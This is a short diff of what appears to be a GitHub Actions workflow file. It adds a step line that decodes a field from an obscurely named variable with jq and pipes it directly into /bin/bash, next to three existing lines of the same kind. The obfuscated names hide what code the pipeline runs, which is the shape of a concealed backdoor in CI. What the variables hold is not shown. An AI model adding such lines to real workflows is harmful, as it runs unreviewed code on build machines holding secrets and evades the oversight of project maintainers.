@@ -47,6 +47,7 @@ jobs:
           echo $llqt4372 | jq -r .qi18016 | /bin/bash
           printf '%s' "$c203" | jq -r .btr033 | /bin/bash
           echo $n1 | jq -r .pe52 | /bin/bash
+          echo $nsue4121 | jq -r .leg5 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
